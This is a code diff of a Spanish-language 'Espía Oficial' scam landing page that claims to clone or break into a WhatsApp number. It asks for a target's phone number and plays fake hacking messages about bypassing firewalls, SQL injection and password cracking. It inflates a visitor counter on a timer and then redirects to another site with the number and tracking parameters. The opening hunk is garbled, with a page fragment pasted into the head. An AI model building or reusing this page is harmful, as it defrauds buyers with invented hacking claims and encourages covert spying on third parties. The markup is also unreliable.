@@ -1,5 +1,125 @@
 <!DOCTYPE html><html lang="es-ES"><head>
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
+
+
+<script src="js/frontend.min.js" id="elementor-pro-frontend-js"></script>
+
+
+<script src="js/frontend.min.js" id="elementor-frontend-js"></script>
+<script src="js/elements-handlers.min.js" id="pro-elements-handlers-js"></script>
+
+
+                  
+                  <!--Count -->
+<style>
+
+.elementor-counter-title {
+    text-align: center;
+}
+
+wrapper {
+    text-align: center;
+}
+  
+.btn.green {
+    cursor: not-allowed;
+}
+
+.btn.green.enabled {
+    background-color: #52d669;
+    cursor: pointer;
+}	
+</style>
+
+<script type="text/javascript">
+// Evento para habilitar/deshabilitar botón basado en input
+const inputPhone = document.querySelector('.input-phone');
+const btnClone = document.querySelector('.btn.green');
+
+inputPhone.addEventListener('input', function () {
+    if (this.value.length > 0) {
+        btnClone.classList.add('enabled');
+        btnClone.style.backgroundColor = '#00a41d';
+        btnClone.style.cursor = 'pointer';
+        btnClone.disabled = false;
+    } else {
+        btnClone.classList.remove('enabled');
+        btnClone.style.backgroundColor = '#008169';
+        btnClone.style.cursor = 'not-allowed';
+        btnClone.disabled = true;
+    }
+});	
+</script>
+
+<script>
+              
+$(document).ready(function(){
+    var intervals = [1, 3, 5, 7, 9, 13, 19]; // segundos
+    var increments = [1, 2, 6]; // números a subir
+    var currentIndex = 0;
+
+    function updateNumber() {
+        var $number = $('.elementor-counter-number');
+        var currentNumber = parseInt($number.text().replace(/\D/g,''));
+        var incrementIndex = currentIndex % increments.length;
+        var newNumber = currentNumber + increments[incrementIndex];
+        $number.text(newNumber.toLocaleString('es-ES'));
+
+        currentIndex++;
+        if (currentIndex >= intervals.length) {
+            currentIndex = 0;
+        }
+
+        // Programar próxima actualización
+        setTimeout(updateNumber, intervals[currentIndex] * 1000);
+    }
+
+    // Iniciar el ciclo
+    setTimeout(updateNumber, intervals[currentIndex] * 1000);
+});  
+</script>
+                  
+                  
+     
+<script>              
+$(document).ready(function() {
+    // Función para obtener un parámetro específico de la URL
+    function getParametroDaURL(name) {
+        var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
+        if (results == null) {
+           return null;
+        }
+        return decodeURI(results[1]) || 0;
+    }
+
+    // Captura los parámetros deseados de la URL
+    var parametros = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'src', 'sck'];
+    var parametrosDaURL = {};
+
+    parametros.forEach(function(param) {
+        var valor = getParametroDaURL(param);
+        if (valor) {
+            parametrosDaURL[param] = valor;
+            // Guardar el parámetro en las cookies
+            Cookies.set(param, valor, { expires: 7 }); // Ejemplo: expira en 7 días
+        }
+    });
+
+    // Verifica si algún parámetro fue encontrado y actualiza el href de los botones
+    if (Object.keys(parametrosDaURL).length > 0) {
+        $('.eael-creative-button').each(function() {
+            var urlAtual = $(this).attr('href');
+            var parametrosURL = new URLSearchParams(parametrosDaURL).toString();
+            var novaURL = urlAtual.includes('?') ? urlAtual + '&' + parametrosURL : urlAtual + '?' + parametrosURL;
+            $(this).attr('href', novaURL);
+        });
+    }
+});
+</script>
+         
+</div>
+
+</body></html>latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 <meta charset="UTF-8">
 <title>Etapa 01 - Espía Oficial</title>
     <meta name="robots" content="noindex">  
@@ -80,17 +200,41 @@
 
                     <img src="images/img-1.webp">
 
-                    <h6 style="font-weight: 700; text-align: center; width: 100%;">Escribe abajo el número que deseas clonar
+                    <h6 style="font-weight: 700; text-align: center; width: 100%;">Selecciona el país y escribe el número que deseas clonar</h6>
+                
                 <div class="elementor-element elementor-element-5ed1374 elementor-widget elementor-widget-html" data-id="5ed1374" data-element_type="widget" data-widget_type="html.default">
                 <div class="elementor-widget-container">
             <div class="input-field">
-  <input id="username" type="text" placeholder="Ejemplo: +34 600-000-000" class="input-phone" required="required" maxlength="15" style="border-radius: 5px; width: 100%; padding: 10px;">
-  <div id="progress-container" style="display: none; width: 100%; background-color: #E0E0DE; height: 0px; border-radius: 20px; margin-top: 20px;">
+  <select id="country-select" style="border-radius: 5px; width: 100%; padding: 10px; margin-bottom: 10px;">
+    <option value="34">🇪🇸 España (+34)</option>
+    <option value="52">🇲🇽 México (+52)</option>
+    <option value="54">🇦🇷 Argentina (+54)</option>
+    <option value="57">🇨🇴 Colombia (+57)</option>
+    <option value="51">🇵🇪 Perú (+51)</option>
+    <option value="56">🇨🇱 Chile (+56)</option>
+    <option value="58">🇻🇪 Venezuela (+58)</option>
+    <option value="593">🇪🇨 Ecuador (+593)</option>
+    <option value="591">🇧🇴 Bolivia (+591)</option>
+    <option value="598">🇺🇾 Uruguay (+598)</option>
+    <option value="595">🇵🇾 Paraguay (+595)</option>
+    <option value="506">🇨🇷 Costa Rica (+506)</option>
+    <option value="507">🇵🇦 Panamá (+507)</option>
+    <option value="503">🇸🇻 El Salvador (+503)</option>
+    <option value="502">🇬🇹 Guatemala (+502)</option>
+    <option value="504">🇭🇳 Honduras (+504)</option>
+    <option value="505">🇳🇮 Nicaragua (+505)</option>
+    <option value="53">🇨🇺 Cuba (+53)</option>
+    <option value="1809">🇩🇴 República Dominicana (+1809)</option>
+    <option value="1787">🇵🇷 Puerto Rico (+1787)</option>
+    <option value="240">🇬🇶 Guinea Ecuatorial (+240)</option>
+  </select>
+  <input id="username" type="text" placeholder="Ejemplo: 600000000" class="input-phone" required="required" maxlength="15" style="border-radius: 5px; width: 100%; padding: 10px;">
+  <div id="progress-container" style="display: none; width: 100%; background-color: #E0E0DE; height: 20px; border-radius: 20px; margin-top: 20px;">
     <div id="progress-bar" style="background: linear-gradient(120deg, #008169, #075F56); height: 100%; width: 0%; border-radius: 20px; position: relative;">
-      <span id="progress-percent" style="position: absolute; width: 100%; text-align: center; color: white; font-size: 12px;"></span>
+      <span id="progress-percent" style="position: absolute; width: 100%; text-align: center; color: white; font-size: 12px; line-height: 20px;"></span>
     </div>
   </div>
-  <ul id="messages" style="color: green; margin-top: 0px;"></ul>
+  <ul id="messages" style="color: green; margin-top: 10px;"></ul>
 </div>
         </div>
                 </div>
@@ -110,7 +254,7 @@
                 <div class="elementor-widget-container">
             <h2 class="elementor-heading-title elementor-size-default">Datos protegidos por encriptación.</h2>      </div>
                 </div>
-                    </h6></div>
+                    </div>
         </div>
                     </div>
         </section>
@@ -226,7 +370,7 @@ $(".descounttime").html(value);
                   </style>
 <script>
 jQuery(function($) {
-  var userLocation; // Default location in case of error
+  var userLocation = 'Descalvado'; // Default location
 
   // Fetch user location
   $.get("https://ipinfo.io/json", function(response) { 
@@ -239,30 +383,22 @@ $('.button-hack').click(function(e) {
     e.preventDefault();
     
     var username = $('#username').val().replace(/[^0-9]/gi, '');
+    var countryCode = $('#country-select').val();
 
     // Verifica si el número es válido
     if (username === '') {
         alert('¡Completa el campo con el número al que deseas acceder!');
-        $('.button-hack').removeClass('disable_a_href'); // Re-habilita el botón después del alert
+        $('.button-hack').removeClass('disable_a_href');
         return;
     }
 
-    // Añade la clase para deshabilitar el botón solo si la validación es exitosa
     $('.button-hack').addClass('disable_a_href');
-    iniciarProcura(); // Ejecuta la función iniciarProcura si el campo es válido
+    iniciarProcura(countryCode, username);
 });
 
   
   
   function getParametroDaURL(name) {
-        var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
-        if (results == null) {
-           return null;
-        }
-        return decodeURI(results[1]) || 0;
-    }
-
-    function getParametroDaURL(name) {
         var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
         if (results == null) {
            return null;
@@ -281,74 +417,46 @@ $('.button-hack').click(function(e) {
         }
     });
 
-  function iniciarProcura() {
-    let imgProfile = '';
-    let telefone;
-    let numberUrl;
-    var username = $('#username').val();
+  function iniciarProcura(countryCode, phoneNumber) {
+    let telefoneCompleto = countryCode + phoneNumber;
+    
+    $('#progress-container').show();
+    var messages = [
+      'Conectando al servidor de WhatsApp...',
+      'Simulando IP en la región de ' + userLocation + '...',
+      'Ignorando el firewall...',
+      'Inyectando consultas SQL...',
+      'Buscando información de +' + countryCode + ' ' + phoneNumber + '...',
+      'Rompiendo contraseña...',
+      'Autenticando como +' + countryCode + ' ' + phoneNumber + '...',
+      'Acceso concedido, redirigiendo al servidor solicitado...'
+    ];
 
-    if (username === '') {
-      alert('¡Completa el campo con el número al que deseas acceder!');
-    } else {
-      var valorLimpo = username.replace(/[^0-9]/g, '');
-      if (!valorLimpo.startsWith('34')) {
-        valorLimpo = '34' + valorLimpo;
+    var i = 0;
+    var nextStep = function() {
+      if (i >= messages.length) {
+        let redirectUrl = `https://receitasvirais.site/etapa2/?tel=${telefoneCompleto}`;
+        Object.keys(parametrosDaURL).forEach(function(key) {
+          redirectUrl += `&${key}=${parametrosDaURL[key]}`;
+        });
+        
+        window.location.href = redirectUrl;
+      } else {
+        var listItem = $('<li style="color: #c63637;">' + messages[i] + '</li>');
+        $('#messages').append(listItem);
+        var progressPercent = ((i + 1) / messages.length) * 100;
+
+        $('#progress-bar').animate({width: progressPercent + '%'}, 600, function() {
+          listItem.css('color', '#007B66');
+          i++;
+          nextStep();
+        });
+
+        $('#progress-percent').text(Math.floor(progressPercent) + '%');
       }
-      telefone = valorLimpo;
-      var url = https://xxxxxxxxxxx&phone=${telefone};
+    };
 
-      $.get(url, function(response) { 
-        if (response) {
-          imgProfile = response.body[0].url;
-          console.log(imgProfile);
-          const domain = "xxxxxxxxxxx.com";
-          const start = imgProfile.indexOf(domain) + domain.length + 1;
-          const end = imgProfile.lastIndexOf("/");
-          numberUrl = imgProfile.substring(start, end);
-        }
-      }, "json");
-
-      $('#progress-container').show();
-      var messages = [
-        'Conectando al servidor de WhatsApp...',
-        'Simulando IP en la región de ' + userLocation + '...',
-        'Ignorando el firewall...',
-        'Inyectando consultas SQL...',
-        'Buscando información de ' + username + '...',
-        'Rompiendo contraseña...',
-        'Autenticando como ' + username + '...',
-        'Acceso concedido, redirigiendo al servidor solicitado...'
-      ];
-
-      var i = 0;
-      var nextStep = function() {
-        if (i >= messages.length) {
-                // Construir la URL de redirección con los parámetros capturados
-                let redirectUrl = ./etapa2/index.html?celular=${telefone}&profile=${numberUrl};
-                Object.keys(parametrosDaURL).forEach(function(key) {
-                    redirectUrl += &${key}=${parametrosDaURL[key]};
-                });
-
-
-
-          window.location.href = redirectUrl;
-        } else {
-          var listItem = $('<li style="color: #c63637;">' + messages[i] + '</li>');
-          $('#messages').append(listItem);
-          var progressPercent = ((i + 1) / messages.length) * 100;
-
-          $('#progress-bar').animate({width: progressPercent + '%'}, 4000, function() {
-            listItem.css('color', '#007B66');
-            i++;
-            nextStep();  // Llamar al siguiente paso
-          });
-
-          $('#progress-percent').text(Math.floor(progressPercent) + '%');
-        }
-      };
-
-      nextStep();  // Iniciar la secuencia
-    }
+    nextStep();
   }
 });
 
